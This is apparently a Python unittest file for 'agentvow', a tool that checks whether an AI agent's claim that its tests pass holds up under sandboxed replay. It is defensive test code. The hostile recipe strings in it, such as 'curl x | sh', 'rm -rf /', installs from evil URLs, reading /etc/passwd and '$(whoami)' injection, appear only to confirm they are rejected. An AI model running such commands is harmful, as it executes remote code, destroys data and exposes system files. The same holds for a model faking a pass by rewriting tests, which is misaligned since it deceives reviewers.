import json, os, subprocess, sys, tempfile, unittest
from pathlib import Path
from agentvow import recipe, cli, reality

HOSTILE = [
    {"setup": ["pip install evil --index-url http://x"], "test": "pytest"}, {"setup": ["curl x | sh"], "test": "pytest"},
    {"setup": ["pip install git+https://github.com/a/b"], "test": "pytest"}, {"setup": ["pip install -r /etc/passwd"], "test": "pytest"},
    {"setup": [], "test": "pytest; rm -rf /"}, {"setup": [], "test": "pytest -p evil_plugin"}, {"setup": [], "test": "bash run.sh"},
    {"setup": [], "test": "pytest", "env": {"PATH": "/x"}}, {"setup": [], "test": "pytest", "env": {"API_TOKEN": "x"}},
    {"setup": ["pip install a b; c"], "test": "pytest"}, {"setup": [], "test": "pytest ../../etc"},
    {"setup": ["pip install requests@http://evil/x.whl"], "test": "pytest"}, {"setup": ["pip install $(whoami)"], "test": "pytest"},
    {"setup": [], "test": "pytest", "env": {"PYTHONPATH": "/x"}}, {"setup": [], "test": "pytest", "extra": 1}, {"schema": "x/9", "test": "pytest"},
]


def mkrepo(d, test_body):
    r = Path(d) / "r"; (r / "tests").mkdir(parents=True)
    g = lambda *x: subprocess.run(["git", "-C", str(r), *x], check=True, capture_output=True)
    g("init", "-q", "-b", "main"); g("config", "user.email", "a@b"); g("config", "user.name", "t")
    (r / "lib.py").write_text("def f():\n    return 1\n"); (r / "tests" / "__init__.py").write_text(""); (r / "tests" / "test_a.py").write_text(test_body)
    g("add", "."); g("commit", "-qm", "base")
    (r / "lib.py").write_text("def f():\n    return 2\n"); g("commit", "-qam", "change")
    return r


class Validation(unittest.TestCase):
    def test_hostile_recipes_are_rejected(self):
        for h in HOSTILE:
            with self.assertRaises(recipe.RecipeError, msg=str(h)):
                recipe.parse(h)

    def test_a_normal_recipe_parses_to_argv_never_a_shell_line(self):
        r = recipe.parse({"setup": ["pip install -e .[dev]", "pip install pytest>=7"], "test": "pytest -q -k 'not slow' tests/test_a.py::test_x", "env": {"APP_MODE": "test"}})
        self.assertEqual(r.test, ["-m", "pytest", "-q", "-k", "not slow", "tests/test_a.py::test_x"])
        self.assertEqual(r.setup[1], ["pytest>=7"]); self.assertEqual(r.env, {"APP_MODE": "test"}); self.assertEqual(len(r.sha256), 16)

    def test_hash_changes_with_content(self):
        a = recipe.parse({"test": "pytest"}); b = recipe.parse({"test": "pytest -x"})
        self.assertNotEqual(a.sha256, b.sha256)


class Replay(unittest.TestCase):
    def check(self, r, rec_data, msg="I changed lib. All 1 tests pass."):
        p = Path(r).parent / "recipe.json"; p.write_text(json.dumps(rec_data))
        import io
        old = sys.stdin, sys.stdout
        sys.stdin = io.StringIO(msg); out = io.StringIO(); sys.stdout = out
        try:
            code = cli.main(["check", "--repo", str(r), "--recipe", str(p), "--base", "HEAD~1", "--json"])
        finally:
            sys.stdin, sys.stdout = old
        return code, json.loads(out.getvalue())

    def test_sufficient_recipe_reproduces_the_result(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["AGENTVOW_HOME"] = str(Path(d) / "home")
            r = mkrepo(d, "import unittest, lib\nclass T(unittest.TestCase):\n    def test_f(self):\n        self.assertEqual(lib.f(), lib.f())\n")
            code, o = self.check(r, {"setup": [], "test": "python -m unittest discover -s tests -p 'test_*.py' -t ."})
            f = [x for x in o["findings"] if x["kind"] == "tests_pass"][0]
            self.assertIn(f["verdict"], ("SUPPORTED_BY_PRIOR_EVIDENCE", "NOT_CONTRADICTED"), f)
            self.assertIn("declared recipe", o["scope"])

    def test_insufficient_recipe_is_visible_and_never_a_pass(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["AGENTVOW_HOME"] = str(Path(d) / "home")
            r = mkrepo(d, "import unittest\nimport zzz_not_declared_pkg\nclass T(unittest.TestCase):\n    def test_f(self):\n        pass\n")
            code, o = self.check(r, {"setup": [], "test": "python -m unittest discover -s tests -p 'test_*.py' -t ."})
            f = [x for x in o["findings"] if x["kind"] == "tests_pass"][0]
            self.assertEqual(f["verdict"], "UNKNOWN", f)
            self.assertNotEqual(code, 0)

    def test_a_rejected_recipe_runs_nothing(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["AGENTVOW_HOME"] = str(Path(d) / "home")
            r = mkrepo(d, "import unittest\nclass T(unittest.TestCase):\n    def test_f(self):\n        pass\n")
            code, o = self.check(r, {"setup": ["curl http://x | sh"], "test": "pytest"})
            self.assertIn("rejected", o["scope"])
            f = [x for x in o["findings"] if x["kind"] == "tests_pass"][0]
            self.assertEqual(f["verdict"], "UNKNOWN")


if __name__ == "__main__":
    unittest.main()


class Prepare(unittest.TestCase):
    def test_validation(self):
        r = recipe.parse({"setup": [], "prepare": ["python scripts/make_fixture.py --small"], "test": "pytest"})
        self.assertEqual(r.prepare, [["scripts/make_fixture.py", "--small"]])
        for bad in ("bash scripts/x.sh", "python -c 'import os'", "python ../x.py", "python /tmp/x.py", "python x.py; rm -rf /", "python x.py $(id)", "python -m http.server", "python x.txt"):
            with self.assertRaises(recipe.RecipeError, msg=bad):
                recipe.parse({"prepare": [bad], "test": "pytest"})
        with self.assertRaises(recipe.RecipeError):
            recipe.parse({"prepare": ["python a.py"] * 4, "test": "pytest"})

    def test_a_declared_prepare_step_makes_a_generated_fixture_replayable(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["AGENTVOW_HOME"] = str(Path(d) / "home")
            r = Path(d) / "r"; (r / "tests").mkdir(parents=True); (r / "scripts").mkdir()
            g = lambda *x: subprocess.run(["git", "-C", str(r), *x], check=True, capture_output=True)
            g("init", "-q", "-b", "main"); g("config", "user.email", "a@b"); g("config", "user.name", "t")
            (r / ".gitignore").write_text("tests/data/\n"); (r / "tests" / "__init__.py").write_text("")
            (r / "scripts" / "mk.py").write_text("import pathlib\np = pathlib.Path('tests/data'); p.mkdir(parents=True, exist_ok=True)\n(p / 'x.txt').write_text('hi')\n")
            (r / "tests" / "test_a.py").write_text("import unittest, pathlib\nclass T(unittest.TestCase):\n    def test_f(self):\n        self.assertEqual(pathlib.Path('tests/data/x.txt').read_text(), 'hi')\n")
            g("add", "-A"); g("commit", "-qm", "base")
            (r / "tests" / "data").mkdir(); (r / "tests" / "data" / "x.txt").write_text("hi")     # the agent's environment: the file exists, untracked/ignored
            test = "python -m unittest discover -s tests -p 'test_*.py' -t ."
            res = {}
            for label, extra in (("without", {}), ("with", {"prepare": ["python scripts/mk.py"]})):
                p = Path(d) / f"{label}.json"; p.write_text(json.dumps({"setup": [], "test": test, **extra}))
                import io
                old = sys.stdin, sys.stdout; sys.stdin = io.StringIO("All tests pass."); sys.stdout = io.StringIO()
                try:
                    cli.main(["check", "--repo", str(r), "--recipe", str(p), "--base", "HEAD", "--json"])
                finally:
                    sys.stdin, sys.stdout = old
                ev = [json.loads(f.read_text()) for f in (r / ".agentvow" / "evidence").glob("testrun_*.json")]
                res[label] = ev[-1]["result"]
                import shutil; shutil.rmtree(r / ".agentvow", ignore_errors=True)
            self.assertNotEqual(res["without"], "pass")   # the ignored fixture does not exist in a clean checkout (an error, so inconclusive)
            self.assertEqual(res["with"], "pass")      # the declared script generates it, inside the sandbox


class Integrity(unittest.TestCase):
    def _repo(self, d, script):
        r = Path(d) / "r"; (r / "tests").mkdir(parents=True); (r / "scripts").mkdir()
        g = lambda *x: subprocess.run(["git", "-C", str(r), *x], check=True, capture_output=True)
        g("init", "-q", "-b", "main"); g("config", "user.email", "a@b"); g("config", "user.name", "t")
        (r / "tests" / "__init__.py").write_text("")
        (r / "tests" / "test_a.py").write_text("import unittest\nclass T(unittest.TestCase):\n    def test_f(self):\n        self.assertEqual(1, 2)\n")
        (r / "scripts" / "mk.py").write_text(script)
        g("add", "-A"); g("commit", "-qm", "base")
        return r

    def _run(self, r, d):
        p = Path(d) / "rec.json"
        p.write_text(json.dumps({"setup": [], "prepare": ["python scripts/mk.py"], "test": "python -m unittest discover -s tests -p 'test_*.py' -t ."}))
        import io
        old = sys.stdin, sys.stdout; sys.stdin = io.StringIO("All tests pass."); out = io.StringIO(); sys.stdout = out
        try:
            cli.main(["check", "--repo", str(r), "--recipe", str(p), "--base", "HEAD", "--json"])
        finally:
            sys.stdin, sys.stdout = old
        ev = [json.loads(f.read_text()) for f in (r / ".agentvow" / "evidence").glob("testrun_*.json")]
        return ev[-1], json.loads(out.getvalue())

    def test_a_prepare_script_that_rewrites_a_test_is_not_accepted_as_evidence(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["AGENTVOW_HOME"] = str(Path(d) / "home")
            r = self._repo(d, "import pathlib\npathlib.Path('tests/test_a.py').write_text('import unittest\\nclass T(unittest.TestCase):\\n    def test_f(self):\\n        pass\\n')\n")
            ev, o = self._run(r, d)
            self.assertEqual(ev["result"], "inconclusive"); self.assertIn("changed existing repository files", ev["summary"])
            f = [x for x in o["findings"] if x["kind"] == "tests_pass"][0]
            self.assertEqual(f["verdict"], "UNKNOWN")

    def test_a_prepare_script_may_create_new_files(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["AGENTVOW_HOME"] = str(Path(d) / "home")
            r = self._repo(d, "import pathlib\npathlib.Path('tests/data').mkdir(exist_ok=True)\npathlib.Path('tests/data/x.txt').write_text('hi')\n")
            ev, o = self._run(r, d)
            self.assertNotIn("changed existing", ev["summary"])       # the (deliberately failing) test ran: creation is allowed
            self.assertIn(ev["result"], ("fail", "inconclusive"))

    def test_recipe_support_states_its_basis(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["AGENTVOW_HOME"] = str(Path(d) / "home")
            r = self._repo(d, "pass\n")
            (r / "tests" / "test_a.py").write_text("import unittest\nclass T(unittest.TestCase):\n    def test_f(self):\n        pass\n")
            ev, o = self._run(r, d)
            f = [x for x in o["findings"] if x["kind"] == "tests_pass"][0]
            self.assertIn(f["verdict"], ("SUPPORTED_BY_PRIOR_EVIDENCE", "NOT_CONTRADICTED"))
            self.assertIn("declared recipe", f["why"]); self.assertEqual(f["meta"].get("support_basis"), "agent_recipe")


class SelectionFidelity(unittest.TestCase):
    def _repo(self, d):
        r = Path(d) / "r"; (r / "tests").mkdir(parents=True)
        g = lambda *x: subprocess.run(["git", "-C", str(r), *x], check=True, capture_output=True)
        g("init", "-q", "-b", "main"); g("config", "user.email", "a@b"); g("config", "user.name", "t")
        (r / "tests" / "__init__.py").write_text("")
        (r / "tests" / "test_a.py").write_text("import unittest\nclass T(unittest.TestCase):\n    def test_a(self):\n        pass\n")
        g("add", "-A"); g("commit", "-qm", "base")
        # the patch adds a second test file
        (r / "tests" / "test_b.py").write_text("import unittest\nclass U(unittest.TestCase):\n    def test_b(self):\n        pass\n")
        return r

    def _check(self, r, d, test):
        p = Path(d) / "rec.json"; p.write_text(json.dumps({"setup": [], "test": test}))
        import io
        old = sys.stdin, sys.stdout; sys.stdin = io.StringIO("All tests pass."); out = io.StringIO(); sys.stdout = out
        try:
            cli.main(["check", "--repo", str(r), "--recipe", str(p), "--base", "HEAD", "--json"])
        finally:
            sys.stdin, sys.stdout = old
        return [x for x in json.loads(out.getvalue())["findings"] if x["kind"] == "tests_pass"][0]

    def test_a_recipe_that_skips_the_added_test_file_is_not_support(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["AGENTVOW_HOME"] = str(Path(d) / "home")
            r = self._repo(d)
            f = self._check(r, d, "python -m unittest discover -s tests -p 'test_a.py' -t .")
            self.assertEqual(f["verdict"], "UNKNOWN"); self.assertIn("test_b.py", f["why"]); self.assertTrue(f["attention"])

    def test_a_recipe_that_runs_everything_is_support(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["AGENTVOW_HOME"] = str(Path(d) / "home")
            r = self._repo(d)
            f = self._check(r, d, "python -m unittest discover -s tests -p 'test_*.py' -t .")
            self.assertIn(f["verdict"], ("SUPPORTED_BY_PRIOR_EVIDENCE", "NOT_CONTRADICTED")); self.assertIn("declared recipe", f["why"])

    def test_executed_test_files_maps_pytest_and_unittest_ids(self):
        from agentvow import runner
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / "tests").mkdir(); (Path(d) / "tests" / "test_x.py").write_text("")
            self.assertEqual(runner.executed_test_files(["tests/test_x.py::test_a", "tests/test_y.py::test_b"], Path(d)), ["tests/test_x.py", "tests/test_y.py"])
            self.assertEqual(runner.executed_test_files(["test_f (tests.test_x.T.test_f)", "test_g (nowhere.T.test_g)"], Path(d)), ["tests/test_x.py"])


def _online():
    import socket
    try:
        socket.create_connection(("pypi.org", 443), timeout=4).close()
        return True
    except OSError:
        return False


@unittest.skipUnless(_online(), "needs network (pip builds a sub-package)")
class Monorepo(unittest.TestCase):
    def test_a_sub_package_install_is_cleaned_up_and_its_sources_stay_importable(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["AGENTVOW_HOME"] = str(Path(d) / "home")
            r = Path(d) / "r"; (r / "libs" / "sub" / "subpkg").mkdir(parents=True); (r / "tests").mkdir()
            (r / "libs" / "sub" / "pyproject.toml").write_text('[build-system]\nrequires = ["setuptools>=61"]\nbuild-backend = "setuptools.build_meta"\n[project]\nname = "sub-dist"\nversion = "0.1"\n[tool.setuptools]\npackages = ["subpkg"]\n')
            (r / "libs" / "sub" / "subpkg" / "__init__.py").write_text("VALUE = 2\n")
            (r / "tests" / "__init__.py").write_text("")
            (r / "tests" / "test_a.py").write_text("import unittest\nimport subpkg\nclass T(unittest.TestCase):\n    def test_a(self):\n        self.assertEqual(subpkg.VALUE, 2)\n")
            g = lambda *x: subprocess.run(["git", "-C", str(r), *x], check=True, capture_output=True)
            g("init", "-q", "-b", "main"); g("config", "user.email", "a@b"); g("config", "user.name", "t"); g("add", "-A"); g("commit", "-qm", "base")
            (r / "libs" / "sub" / "subpkg" / "__init__.py").write_text("VALUE = 2  # changed\n")        # the patch edits the sub-package
            p = Path(d) / "rec.json"; p.write_text(json.dumps({"setup": ["pip install -e libs/sub"], "test": "python -m unittest discover -s tests -p 'test_*.py' -t ."}))
            import io
            old = sys.stdin, sys.stdout, sys.stderr; sys.stdin = io.StringIO("All tests pass."); sys.stdout = io.StringIO(); sys.stderr = io.StringIO()
            try:
                cli.main(["check", "--repo", str(r), "--recipe", str(p), "--base", "HEAD", "--json"])
            finally:
                sys.stdin, sys.stdout, sys.stderr = old
            ev = [json.loads(f.read_text()) for f in (r / ".agentvow" / "evidence").glob("testrun_*.json")][-1]
            self.assertEqual(ev["result"], "pass", ev.get("summary"))   # no isolation failure, and the worktree's copy of subpkg is the one imported


class ScopeToTheClaim(unittest.TestCase):
    def test_a_broad_command_with_unrelated_failures_still_reports_the_changed_tests(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["AGENTVOW_HOME"] = str(Path(d) / "home")
            r = Path(d) / "r"; (r / "tests").mkdir(parents=True)
            (r / "tests" / "__init__.py").write_text("")
            (r / "tests" / "test_other.py").write_text("import unittest\nclass O(unittest.TestCase):\n    def test_unrelated(self):\n        self.fail('pre-existing')\n")
            g = lambda *x: subprocess.run(["git", "-C", str(r), *x], check=True, capture_output=True)
            g("init", "-q", "-b", "main"); g("config", "user.email", "a@b"); g("config", "user.name", "t"); g("add", "-A"); g("commit", "-qm", "base")
            (r / "tests" / "test_new.py").write_text("import unittest\nclass N(unittest.TestCase):\n    def test_new(self):\n        self.assertTrue(True)\n")
            p = Path(d) / "rec.json"; p.write_text(json.dumps({"setup": [], "test": "python -m unittest discover -s tests -p 'test_*.py' -t ."}))
            import io
            old = sys.stdin, sys.stdout; sys.stdin = io.StringIO("All tests pass."); out = io.StringIO(); sys.stdout = out
            try:
                cli.main(["check", "--repo", str(r), "--recipe", str(p), "--base", "HEAD", "--json"])
            finally:
                sys.stdin, sys.stdout = old
            f = [x for x in json.loads(out.getvalue())["findings"] if x["kind"] == "tests_pass"][0]
            self.assertEqual(f["verdict"], "NOT_CONTRADICTED")
            self.assertIn("test_new.py", f["why"]); self.assertIn("'all tests pass' is not shown", f["why"])
            self.assertEqual(f["meta"].get("scope"), "changed_tests")

    def test_if_a_changed_test_fails_the_scope_rule_does_not_apply(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["AGENTVOW_HOME"] = str(Path(d) / "home")
            r = Path(d) / "r"; (r / "tests").mkdir(parents=True); (r / "tests" / "__init__.py").write_text("")
            (r / "tests" / "test_a.py").write_text(TEST_PASS if False else "import unittest\nclass A(unittest.TestCase):\n    def test_a(self):\n        pass\n")
            g = lambda *x: subprocess.run(["git", "-C", str(r), *x], check=True, capture_output=True)
            g("init", "-q", "-b", "main"); g("config", "user.email", "a@b"); g("config", "user.name", "t"); g("add", "-A"); g("commit", "-qm", "base")
            (r / "tests" / "test_new.py").write_text("import unittest\nclass N(unittest.TestCase):\n    def test_new(self):\n        self.fail('the new test fails')\n")
            p = Path(d) / "rec.json"; p.write_text(json.dumps({"setup": [], "test": "python -m unittest discover -s tests -p 'test_*.py' -t ."}))
            import io
            old = sys.stdin, sys.stdout; sys.stdin = io.StringIO("All tests pass."); out = io.StringIO(); sys.stdout = out
            try:
                cli.main(["check", "--repo", str(r), "--recipe", str(p), "--base", "HEAD", "--json"])
            finally:
                sys.stdin, sys.stdout = old
            f = [x for x in json.loads(out.getvalue())["findings"] if x["kind"] == "tests_pass"][0]
            self.assertNotEqual(f["verdict"], "NOT_CONTRADICTED")


class RunnerSupplied(unittest.TestCase):
    def test_uses_pytest_detection(self):
        for t, want in (("pytest -q tests", True), ("python -m pytest tests", True), ("python -m unittest discover", False)):
            self.assertEqual(recipe._uses_pytest(recipe.parse({"setup": [], "test": t})), want, t)


@unittest.skipUnless(_online(), "needs network (installs the runner)")
class RunnerSuppliedReplay(unittest.TestCase):
    def test_build_env_supplies_pytest(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["AGENTVOW_HOME"] = str(Path(d) / "home")
            r = mkrepo(d, "def test_f():\n    pass\n")
            rec = recipe.parse({"setup": [], "test": "pytest -q tests"})
            py, notes, aborted = recipe.build_env(r, rec, Path(d) / "venv", Path(d) / "h")
            self.assertEqual(rec.runner_supplied, "pytest", (rec.test, notes, aborted))

    def test_an_omitted_pytest_is_installed_and_the_verdict_says_so(self):
        with tempfile.TemporaryDirectory() as d:
            os.environ["AGENTVOW_HOME"] = str(Path(d) / "home")
            r = mkrepo(d, "import lib\n\ndef test_f():\n    assert lib.f() == 2\n")
            p = Path(d) / "rec.json"; p.write_text(json.dumps({"setup": [], "test": "pytest -q tests"}))
            import io
            old = sys.stdin, sys.stdout, sys.stderr; sys.stdin = io.StringIO("All tests pass."); out = io.StringIO(); sys.stdout = out; sys.stderr = io.StringIO()
            try:
                cli.main(["check", "--repo", str(r), "--recipe", str(p), "--base", "HEAD~1", "--json"])
            finally:
                sys.stdin, sys.stdout, sys.stderr = old
            f = [x for x in json.loads(out.getvalue())["findings"] if x["kind"] == "tests_pass"][0]
            self.assertIn(f["verdict"], ("SUPPORTED_BY_PRIOR_EVIDENCE", "NOT_CONTRADICTED"), f)
            self.assertEqual(f["meta"].get("runner_supplied"), "pytest", f)
            self.assertIn("installed pytest itself", f["why"])
